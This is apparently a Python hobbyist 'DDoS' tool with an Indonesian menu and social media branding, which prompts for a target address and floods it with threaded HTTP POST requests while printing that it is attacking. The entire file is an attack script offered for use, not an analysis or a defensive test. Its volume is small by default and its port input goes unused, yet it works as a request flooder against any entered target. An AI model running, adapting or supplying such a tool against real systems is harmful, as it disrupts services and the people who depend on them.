import os
import time
import threading
import requests

def send_custom_requests(target_url, method="POST", data=None, headers=None, requests_per_second=5, duration=5):
    def send_request():
        try:
            if method.upper() == "POST":
                res = requests.post(target_url, data=data, headers=headers, timeout=5)
            else:
                res = requests.get(target_url, params=data, headers=headers, timeout=5)
            print(f"[{res.status_code}] => Request sent")
        except Exception as e:
            print(f"[ERROR] {e}")

    interval = 1 / requests_per_second
    total_requests = int(requests_per_second * duration)

    for _ in range(total_requests):
        threading.Thread(target=send_request).start()
        time.sleep(interval)

def menu():
    os.system("clear")
    print("========================================")
    print("      Welcome To Tools Frogzz")
    print("========================================")
    print("[ My TikTok  : @frogzzproject ]")
    print("[ My GitHub  : github.com/frogzzproject ]")
    print("[ My YouTube : youtube.com/@frogzz ]\n")
    print("[1] DDoS V0.5")
    print("========================================")
    pilihan = input("Pilih nomor: ")

    if pilihan == "1":
        print("\n[!] Cara pakai: python main.py <ip> 80 5\n")
        target_url = input("Target IP / Domain (contoh: http://1.1.1.1): ")
        port = input("Port (contoh: 80): ")
        packets = int(input("Packets per second (contoh: 5): "))
        duration = 5  # durasi default 5 detik

        print(f"\n[+] Menyerang {target_url} di port {port}")
        print(f"[+] {packets} request/detik selama {duration} detik\n")

        send_custom_requests(
            target_url=target_url,
            method="POST",
            data={"packet": f"Frogzz_Test_{port}"},
            headers={"User-Agent": "FrogzzAgent"},
            requests_per_second=packets,
            duration=duration
        )
        input("\nTekan Enter untuk kembali ke menu...")
        menu()
    else:
        print("Pilihan tidak tersedia.")
        time.sleep(1)
        menu()

if __name__ == "__main__":
    menu()